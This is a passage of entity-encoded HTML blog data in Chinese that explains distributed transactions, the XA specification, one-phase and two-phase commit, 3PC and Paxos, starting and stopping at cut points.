;&#x6BB5;&#xFF0C;&#x5F53;&#x4E3B;&#x6301;&#x4EBA;&#x901A;&#x77E5;&#x7B2C;&#x4E00;&#x4F4D;&#x7EC4;&#x5458;&#x8BF7;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#x540E;&#x4E24;&#x4EBA;&#x610F;&#x5916;&#x5931;&#x5FC6;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x5176;&#x4ED6;&#x7EC4;&#x5458;&#x518D;&#x91CD;&#x65B0;&#x9009;&#x51FA;&#x4E3B;&#x6301;&#x4EBA;&#x540E;&#xFF0C;&#x4ECD;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x76EE;&#x524D;&#x81F3;&#x5C11;&#x662F;&#x5904;&#x4E8E;&#x51C6;&#x5907;&#x901A;&#x8FC7;&#x63D0;&#x6848;&#x9636;&#x6BB5;&#xFF0C;&#x8868;&#x793A;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x5927;&#x5BB6;&#x90FD;&#x5DF2;&#x7ECF;&#x51B3;&#x5B9A;&#x8981;&#x901A;&#x8FC7;&#x4E86;&#xFF0C;&#x6B64;&#x65F6;&#x4FBF;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;&#x3002;</p>\n<hr>\n<h3 id=\"&#x540E;&#x8BB0;\"><a href=\"#&#x540E;&#x8BB0;\" class=\"headerlink\" title=\"&#x540E;&#x8BB0;\"></a>&#x540E;&#x8BB0;</h3><p>&#x4E86;&#x89E3;&#x4E86;2PC&#x548C;3PC&#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x53D1;&#x73B0;&#xFF0C;&#x65E0;&#x8BBA;&#x662F;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x8FD8;&#x662F;&#x4E09;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x90FD;&#x65E0;&#x6CD5;&#x5F7B;&#x5E95;&#x89E3;&#x51B3;&#x5206;&#x5E03;&#x5F0F;&#x7684;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#x3002;<br>Google Chubby&#x7684;&#x4F5C;&#x8005;Mike Burrows&#x8BF4;&#x8FC7;&#xFF0C; <strong>there is only one consensus protocol, and that&#x2019;s Paxos&#x201D; &#x2013; all other approaches are just broken versions of Paxos&#x3002;</strong> &#x610F;&#x5373;&#x4E16;&#x4E0A;&#x53EA;&#x6709;&#x4E00;&#x79CD;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#xFF0C;&#x90A3;&#x5C31;&#x662F;Paxos&#xFF0C;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x4E00;&#x81F4;&#x6027;&#x7B97;&#x6CD5;&#x90FD;&#x662F;Paxos&#x7B97;&#x6CD5;&#x7684;&#x4E0D;&#x5B8C;&#x6574;&#x7248;&#x3002;</p>\n","excerpt":"<h3 id=\"&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;</h3><p>&#x5728;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#xFF0C;&#x901A;&#x5E38;&#xFF0C;&#x6211;&#x4EEC;&#x4F1A;&#x5C06;&#x6570;&#x636E;&#x4FDD;&#x7559;&#x591A;&#x4E2A;&#x526F;&#x672C;(replica)&#xFF0C;&#x8FD9;&#x4E9B;&#x526F;&#x672C;&#x4F1A;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x7269;&#x7406;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x3002;&#x4E3A;&#x4E86;&#x5BF9;&#x7528;&#x6237;&#x63D0;&#x4F9B;&#x6B63;&#x786E;&#x7684;&#x589E;&#x3001;&#x5220;&#x3001;&#x6539;&#x3001;&#x67E5;&#x7B49;&#x8BED;&#x4E49;&#xFF0C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x8FD9;&#x4E9B;&#x653E;&#x7F6E;&#x5728;&#x4E0D;&#x540C;&#x7269;&#x7406;&#x673A;&#x5668;&#x4E0A;&#x7684;&#x526F;&#x672C;&#x662F;&#x4E00;&#x81F4;&#x7684;&#x3002;</p>\n<p>&#x4E3A;&#x4E86;&#x89E3;&#x51B3;&#x8FD9;&#x79CD;&#x5206;&#x5E03;&#x5F0F;&#x4E00;&#x81F4;&#x6027;&#x95EE;&#x9898;&#xFF0C;&#x5728;&#x6027;&#x80FD;&#x548C;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x7684;&#x53CD;&#x53CD;&#x590D;&#x590D;&#x6743;&#x8861;&#x8FC7;&#x7A0B;&#x4E2D;&#x603B;&#x7ED3;&#x4E86;&#x8BB8;&#x591A;&#x5178;&#x578B;&#x7684;&#x534F;&#x8BAE;&#x548C;&#x7B97;&#x6CD5;&#x3002;<strong>&#x5176;&#x4E2D;&#x6BD4;&#x8F83;&#x8457;&#x540D;&#x7684;&#x6709;&#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Two Phase Commitment Protocol&#xFF09;&#x3001;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#xFF08;Three Phase Commitment Protocol&#xFF09;&#x548C;Paxos&#x7B97;&#x6CD5;&#x3002;</strong></p>\n<hr>\n<h3 id=\"&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;\"><a href=\"#&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;\" class=\"headerlink\" title=\"&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;\"></a>&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;</h3><blockquote>\n<p>&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x662F;&#x6307;&#x4F1A;&#x6D89;&#x53CA;&#x5230;&#x64CD;&#x4F5C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5C06;&#x5BF9;&#x540C;&#x4E00;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x6982;&#x5FF5;&#x6269;&#x5927;&#x5230;&#x4E86;&#x5BF9;&#x591A;&#x4E2A;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x3002;&#x76EE;&#x7684;&#x662F;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x5206;&#x5E03;&#x5F0F;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5173;&#x952E;&#x662F;&#x5FC5;&#x987B;&#x6709;&#x4E00;&#x79CD;&#x65B9;&#x6CD5;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x4E8B;&#x52A1;&#x5728;&#x4EFB;&#x4F55;&#x5730;&#x65B9;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x52A8;&#x4F5C;&#xFF0C;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E8B;&#x52A1;&#x7684;&#x51B3;&#x5B9A;&#x5FC5;&#x987B;&#x4EA7;&#x751F;&#x7EDF;&#x4E00;&#x7684;&#x7ED3;&#x679C;&#xFF08;&#x5168;&#x90E8;&#x63D0;&#x4EA4;&#x6216;&#x5168;&#x90E8;&#x56DE;&#x6EDA;&#xFF09;</p>\n</blockquote>\n<p>&#x5982;&#x679C;&#x60F3;&#x8BA9;&#x5206;&#x5E03;&#x5F0F;&#x90E8;&#x7F72;&#x7684;&#x591A;&#x53F0;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x6570;&#x636E;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x8981;&#x4FDD;&#x8BC1;&#x5728;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x8981;&#x4E0D;&#x5168;&#x90E8;&#x90FD;&#x6267;&#x884C;&#xFF0C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x7684;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x4E00;&#x53F0;&#x673A;&#x5668;&#x5728;&#x6267;&#x884C;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x65F6;&#x5019;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x4ED6;&#x673A;&#x5668;&#x4E2D;&#x7684;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x7684;&#x6267;&#x884C;&#x7ED3;&#x679C;&#x3002;&#x6240;&#x4EE5;&#x4ED6;&#x4E5F;&#x5C31;&#x4E0D;&#x77E5;&#x9053;&#x672C;&#x6B21;&#x4E8B;&#x52A1;&#x5230;&#x5E95;&#x5E94;&#x8BE5;commit&#x8FD8;&#x662F; roolback&#x3002;&#x6240;&#x4EE5;&#xFF0C;&#x5E38;&#x89C4;&#x7684;&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5F15;&#x5165;&#x4E00;&#x4E2A;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x7684;&#x7EC4;&#x4EF6;&#x6765;&#x7EDF;&#x4E00;&#x8C03;&#x5EA6;&#x6240;&#x6709;&#x5206;&#x5E03;&#x5F0F;&#x8282;&#x70B9;&#x7684;&#x6267;&#x884C;&#x3002;</p>","more":"<hr>\n<h3 id=\"XA&#x89C4;&#x8303;\"><a href=\"#XA&#x89C4;&#x8303;\" class=\"headerlink\" title=\"XA&#x89C4;&#x8303;\"></a>XA&#x89C4;&#x8303;</h3><p>X/Open &#x7EC4;&#x7EC7;&#xFF08;&#x5373;&#x73B0;&#x5728;&#x7684; Open Group &#xFF09;&#x5B9A;&#x4E49;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x6A21;&#x578B;&#x3002; X/Open DTP &#x6A21;&#x578B;&#xFF08; 1994 &#xFF09;&#x5305;&#x62EC;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#xFF08; AP &#xFF09;&#x3001;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x5668;&#xFF08; TM &#xFF09;&#x3001;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; RM &#xFF09;&#x3001;&#x901A;&#x4FE1;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; CRM &#xFF09;&#x56DB;&#x90E8;&#x5206;&#x3002;&#x4E00;&#x822C;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x4E8B;&#x52A1;&#x7BA1;&#x7406;&#x5668;&#xFF08; TM &#xFF09;&#x662F;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; RM &#xFF09;&#x662F;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x5E38;&#x89C1;&#x7684;&#x901A;&#x4FE1;&#x8D44;&#x6E90;&#x7BA1;&#x7406;&#x5668;&#xFF08; CRM &#xFF09;&#x662F;&#x6D88;&#x606F;&#x4E2D;&#x95F4;&#x4EF6;&#x3002;    &#x901A;&#x5E38;&#x628A;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5185;&#x90E8;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#xFF0C;&#x5982;&#x5BF9;&#x591A;&#x4E2A;&#x8868;&#x7684;&#x64CD;&#x4F5C;&#xFF0C;&#x4F5C;&#x4E3A;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#x770B;&#x5F85;&#x3002;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x5BF9;&#x8C61;&#x662F;&#x672C;&#x5730;&#x4E8B;&#x52A1;&#xFF0C;&#x800C;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x7684;&#x5BF9;&#x8C61;&#x662F;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x3002;   &#x6240;&#x8C13;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#xFF0C;&#x662F;&#x6307;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x5904;&#x7406;&#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x591A;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x5171;&#x540C;&#x5B8C;&#x6210;&#x4E00;&#x4E2A;&#x5DE5;&#x4F5C;&#xFF0C;&#x8FD9;&#x4E2A;&#x5DE5;&#x4F5C;&#x5373;&#x662F;&#x4E00;&#x4E2A;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#xFF0C;&#x4F8B;&#x5982;&#xFF0C;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x4E2D;&#x53EF;&#x80FD;&#x66F4;&#x65B0;&#x51E0;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x6570;&#x636E;&#x5E93;&#x3002;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x53D1;&#x751F;&#x5728;&#x7CFB;&#x7EDF;&#x7684;&#x5404;&#x5904;&#x4F46;&#x5FC5;&#x987B;&#x5168;&#x90E8;&#x88AB;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x3002;&#x6B64;&#x65F6;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x5BF9;&#x81EA;&#x5DF1;&#x5185;&#x90E8;&#x6240;&#x505A;&#x64CD;&#x4F5C;&#x7684;&#x63D0;&#x4EA4;&#x4E0D;&#x4EC5;&#x4F9D;&#x8D56;&#x672C;&#x8EAB;&#x64CD;&#x4F5C;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x8FD8;&#x8981;&#x4F9D;&#x8D56;&#x4E0E;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x76F8;&#x5173;&#x7684;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x7684;&#x64CD;&#x4F5C;&#x662F;&#x5426;&#x6210;&#x529F;&#xFF0C;&#x5982;&#x679C;&#x4EFB;&#x4E00;&#x6570;&#x636E;&#x5E93;&#x7684;&#x4EFB;&#x4E00;&#x64CD;&#x4F5C;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x53C2;&#x4E0E;&#x6B64;&#x4E8B;&#x52A1;&#x7684;&#x6240;&#x6709;&#x6570;&#x636E;&#x5E93;&#x6240;&#x505A;&#x7684;&#x6240;&#x6709;&#x64CD;&#x4F5C;&#x90FD;&#x5FC5;&#x987B;&#x56DE;&#x6EDA;&#x3002;     &#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x67D0;&#x4E00;&#x6570;&#x636E;&#x5E93;&#x65E0;&#x6CD5;&#x77E5;&#x9053;&#x5176;&#x5B83;&#x6570;&#x636E;&#x5E93;&#x5728;&#x505A;&#x4EC0;&#x4E48;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x4E00;&#x4E2A; DTP &#x73AF;&#x5883;&#x4E2D;&#xFF0C;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x662F;&#x5FC5;&#x9700;&#x7684;&#xFF0C;&#x7531;&#x5B83;&#x901A;&#x77E5;&#x548C;&#x534F;&#x8C03;&#x76F8;&#x5173;&#x6570;&#x636E;&#x5E93;&#x7684;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x3002;&#x800C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x53EA;&#x5C06;&#x5176;&#x81EA;&#x5DF1;&#x6240;&#x505A;&#x7684;&#x64CD;&#x4F5C;&#xFF08;&#x53EF;&#x6062;&#x590D;&#xFF09;&#x5F71;&#x5C04;&#x5230;&#x5168;&#x5C40;&#x4E8B;&#x52A1;&#x4E2D;&#x3002;    </p>\n<p>XA &#x5C31;&#x662F; X/Open DTP &#x5B9A;&#x4E49;&#x7684;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x4E4B;&#x95F4;&#x7684;&#x63A5;&#x53E3;&#x89C4;&#x8303;&#xFF08;&#x5373;&#x63A5;&#x53E3;&#x51FD;&#x6570;&#xFF09;&#xFF0C;&#x4EA4;&#x6613;&#x4E2D;&#x95F4;&#x4EF6;&#x7528;&#x5B83;&#x6765;&#x901A;&#x77E5;&#x6570;&#x636E;&#x5E93;&#x4E8B;&#x52A1;&#x7684;&#x5F00;&#x59CB;&#x3001;&#x7ED3;&#x675F;&#x4EE5;&#x53CA;&#x63D0;&#x4EA4;&#x3001;&#x56DE;&#x6EDA;&#x7B49;&#x3002; XA &#x63A5;&#x53E3;&#x51FD;&#x6570;&#x7531;&#x6570;&#x636E;&#x5E93;&#x5382;&#x5546;&#x63D0;&#x4F9B;&#x3002; </p>\n<p>&#x4E8C;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x548C;&#x4E09;&#x9636;&#x63D0;&#x4EA4;&#x534F;&#x8BAE;&#x5C31;&#x662F;&#x6839;&#x636E;&#x8FD9;&#x4E00;&#x601D;&#x60F3;&#x884D;&#x751F;&#x51FA;&#x6765;&#x7684;&#x3002;&#x53EF;&#x4EE5;&#x8BF4;&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x5176;&#x5B9E;&#x5C31;&#x662F;&#x5B9E;&#x73B0;XA&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7684;&#x5173;&#x952E;(&#x786E;&#x5207;&#x5730;&#x8BF4;&#xFF0C;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E3B;&#x8981;&#x4FDD;&#x8BC1;&#x4E86;&#x5206;&#x5E03;&#x5F0F;&#x4E8B;&#x52A1;&#x7684;&#x539F;&#x5B50;&#x6027;&#xFF0C;&#x5373;&#x6240;&#x6709;&#x7ED3;&#x70B9;&#x8981;&#x4E48;&#x5168;&#x505A;&#x8981;&#x4E48;&#x5168;&#x4E0D;&#x505A;)</p>\n<hr>\n<h3 id=\"&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Best-Efforts-1PC&#x6A21;&#x5F0F;\"><a href=\"#&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Best-Efforts-1PC&#x6A21;&#x5F0F;\" class=\"headerlink\" title=\"&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Best Efforts 1PC&#x6A21;&#x5F0F;)\"></a>&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Best Efforts 1PC&#x6A21;&#x5F0F;)</h3><p>&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x975E;&#x5E38;&#x76F4;&#x767D;&#xFF0C;&#x5C31;&#x662F;&#x4ECE;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5411;&#x6570;&#x636E;&#x5E93;&#x53D1;&#x51FA;&#x63D0;&#x4EA4;&#x8BF7;&#x6C42;&#x5230;&#x6570;&#x636E;&#x5E93;&#x5B8C;&#x6210;&#x63D0;&#x4EA4;&#x6216;&#x56DE;&#x6EDA;&#x4E4B;&#x540E;&#x5C06;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x7684;&#x8FC7;&#x7A0B;&#x3002;&#x4E00;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x4E0D;&#x9700;&#x8981;&#x201C;&#x534F;&#x8C03;&#x8005;&#x201D;&#x89D2;&#x8272;&#xFF0C;&#x5404;&#x7ED3;&#x70B9;&#x4E4B;&#x95F4;&#x4E0D;&#x5B58;&#x5728;&#x534F;&#x8C03;&#x64CD;&#x4F5C;&#xFF0C;&#x56E0;&#x6B64;&#x5176;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x65F6;&#x95F4;&#x6BD4;&#x4E24;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;&#x8981;&#x77ED;</p>\n<hr>\n<h3 id=\"&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Two-phaseCommit-2PC\"><a href=\"#&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;-Two-phaseCommit-2PC\" class=\"headerlink\" title=\"&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Two-phaseCommit/2PC)\"></a>&#x4E8C;&#x9636;&#x6BB5;&#x63D0;&#x4EA4;(Two-phaseCommit/2PC)</h3><p>&#x53C2;&#x4E0E;&#x8005;&#x5C06;&#x64CD;&#x4F5C;&#x6210;&#x8D25;&#x901A;&#x77E5;&#x534F;&#x8C03;&#x8005;&#xFF0C;&#x518D;&#x7531;&#x534F;&#x8C03;&#x8005;&#x6839;&#x636E;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x7684;&#x53CD;&#x9988;&#x60C5;&#x62A5;&#x51B3;&#x5B9A;&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x662F;&#x5426;&#x8981;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;&#x8FD8;&#x662F;&#x4E2D;&#x6B62;&#x64CD;&#x4F5C;<br>&#x6240;&#x8C13;&#x7684;&#x4E24;&#x4E2A;&#x9636;&#x6BB5;&#x662F;&#x6307;&#xFF1A;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF1A;&#x51C6;&#x5907;&#x9636;&#x6BB5;(&#x6295;&#x7968;&#x9636;&#x6BB5;)&#x548C;&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF1A;&#x63D0;&#x4EA4;&#x9636;&#x6BB5;&#xFF08;&#x6267;&#x884C;&#x9636;&#x6BB5;&#xFF09;</p>\n<h4 id=\"&#x51C6;&#x5907;&#x9636;&#x6BB5;\"><a href=\"#&#x51C6;&#x5907;&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"&#x51C6;&#x5907;&#x9636;&#x6BB5;\"></a>&#x51C6;&#x5907;&#x9636;&#x6BB5;</h4><ol>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x8BE2;&#x95EE;&#x662F;&#x5426;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x63D0;&#x4EA4;&#x64CD;&#x4F5C;(vote)&#xFF0C;&#x5E76;&#x5F00;&#x59CB;&#x7B49;&#x5F85;&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x6267;&#x884C;&#x8BE2;&#x95EE;&#x53D1;&#x8D77;&#x4E3A;&#x6B62;&#x7684;&#x6240;&#x6709;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x5C06;Undo&#x4FE1;&#x606F;&#x548C;Redo&#x4FE1;&#x606F;&#x5199;&#x5165;&#x65E5;&#x5FD7;&#x3002;&#xFF08;&#x6CE8;&#x610F;&#xFF1A;&#x82E5;&#x6210;&#x529F;&#x8FD9;&#x91CC;&#x5176;&#x5B9E;&#x6BCF;&#x4E2A;&#x53C2;&#x4E0E;&#x8005;&#x5DF2;&#x7ECF;&#x6267;&#x884C;&#x4E86;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#xFF09;</li>\n<li>&#x5404;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x54CD;&#x5E94;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x8D77;&#x7684;&#x8BE2;&#x95EE;&#x3002;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x6210;&#x529F;&#xFF0C;&#x5219;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x201D;&#x540C;&#x610F;&#x201D;&#x6D88;&#x606F;&#xFF1B;&#x5982;&#x679C;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x4E8B;&#x52A1;&#x64CD;&#x4F5C;&#x5B9E;&#x9645;&#x6267;&#x884C;&#x5931;&#x8D25;&#xFF0C;&#x5219;&#x5B83;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x201D;&#x4E2D;&#x6B62;&#x201D;&#x6D88;&#x606F;&#x3002;</li>\n</ol>\n<h4 id=\"&#x63D0;&#x4EA4;&#x9636;&#x6BB5;\"><a href=\"#&#x63D0;&#x4EA4;&#x9636;&#x6BB5;\" class=\"headerlink\" title=\"&#x63D0;&#x4EA4;&#x9636;&#x6BB5;\"></a>&#x63D0;&#x4EA4;&#x9636;&#x6BB5;</h4><ol>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x51FA;&#x201D;&#x6B63;&#x5F0F;&#x63D0;&#x4EA4;(commit)&#x201D;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x6B63;&#x5F0F;&#x5B8C;&#x6210;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x91CA;&#x653E;&#x5728;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x671F;&#x95F4;&#x5185;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5411;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x9001;&#x201D;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x3002;</li>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D7;&#x5230;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53CD;&#x9988;&#x7684;&#x201D;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x540E;&#xFF0C;&#x5B8C;&#x6210;&#x4E8B;&#x52A1;&#x3002;</li>\n</ol>\n<p>&#x5982;&#x679C;&#x4EFB;&#x4E00;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x8FD4;&#x56DE;&#x7684;&#x54CD;&#x5E94;&#x6D88;&#x606F;&#x4E3A;&#x201D;&#x4E2D;&#x6B62;&#x201D;&#xFF0C;&#x6216;&#x8005; &#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5728;&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#x7684;&#x8BE2;&#x95EE;&#x8D85;&#x65F6;&#x4E4B;&#x524D;&#x65E0;&#x6CD5;&#x83B7;&#x53D6;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x7684;&#x54CD;&#x5E94;&#x6D88;&#x606F;&#x65F6;</p>\n<ol>\n<li>&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x5411;&#x6240;&#x6709;&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x51FA;&#x201D;&#x56DE;&#x6EDA;&#x64CD;&#x4F5C;(rollback)&#x201D;&#x7684;&#x8BF7;&#x6C42;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5229;&#x7528;&#x4E4B;&#x524D;&#x5199;&#x5165;&#x7684;Undo&#x4FE1;&#x606F;&#x6267;&#x884C;&#x56DE;&#x6EDA;&#xFF0C;&#x5E76;&#x91CA;&#x653E;&#x5728;&#x6574;&#x4E2A;&#x4E8B;&#x52A1;&#x671F;&#x95F4;&#x5185;&#x5360;&#x7528;&#x7684;&#x8D44;&#x6E90;&#x3002;</li>\n<li>&#x53C2;&#x4E0E;&#x8005;&#x8282;&#x70B9;&#x5411;&#x534F;&#x8C03;&#x8005;&#x8282;&#x70B9;&#x53D1;&#x9001;&#x201D;&#x56DE;&#x6EDA;&#x5B8C;&#x6210;&#x201D;&#x6D88;&#x606F;&#x30